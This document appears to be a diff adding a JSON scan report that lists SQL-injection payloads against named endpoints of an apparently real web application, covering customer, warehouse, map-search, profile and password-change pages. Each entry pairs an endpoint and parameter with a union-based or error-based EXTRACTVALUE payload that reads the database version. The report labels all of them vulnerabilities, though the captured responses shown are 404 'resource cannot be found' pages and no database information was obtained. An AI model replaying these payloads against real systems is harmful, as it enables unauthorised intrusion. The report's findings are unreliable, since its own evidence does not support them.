@@ -1,0 +1,238 @@
+{
+  "vulnerabilities": [
+    {
+      "endpoint": "/Handle/SearchListCustomer",
+      "param": "q",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListCustomer",
+      "param": "search",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListCustomer",
+      "param": "keyword",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListProvince",
+      "param": "Type",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "DistrictID",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListDistrictByProvinceID",
+      "param": "ProvinceID",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "id",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "q",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "search",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "keyword",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "name",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "user",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListWareHouse",
+      "param": "user_id",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListProductVariantByWareHouseID",
+      "param": "WareHouseID",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchListFunctionalByGroupPermissionID",
+      "param": "GroupPermissionID",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchPWDByVNPMapsSearch",
+      "param": "q",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchPWDByEMSMapsSearch",
+      "param": "q",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/SearchPWDByVMapCode",
+      "param": "code",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Handle/VNPMapsAutocomplete",
+      "param": "q",
+      "type": "Union-based SQL Injection",
+      "payload": "1' UNION SELECT NULL--"
+    },
+    {
+      "endpoint": "/Account/GetUserInfo",
+      "param": "id",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/GetUserInfo",
+      "param": "ID",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/GetUserInfo",
+      "param": "Id",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "id",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "q",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "search",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "keyword",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "name",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "user",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/ChangePassword",
+      "param": "user_id",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "id",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "q",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "search",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "keyword",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "name",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "user",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    },
+    {
+      "endpoint": "/Account/Profile",
+      "param": "user_id",
+      "type": "Error-based SQL Injection",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "error": "<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <title>The resource cannot be found.</title>\r\n        <meta name=\"viewport\" content=\"width=device-width\" />\r\n        <style>\r\n         body {font-family:\"Verdana\";font-weight:normal;font-size: .7em;color:black;} \r\n         p {font-family:\"Verdana\";font-weight:normal;color:black;margin-top: -5px}\r\n         b {font-family:\"Verdana\";font-weight:bold;color:black;margin-top: -5px}\r\n         H1 { font-family:\"Verdana\";font-weight:normal;font-size:18pt;color"
+    }
+  ],
+  "db_info": {}
+}
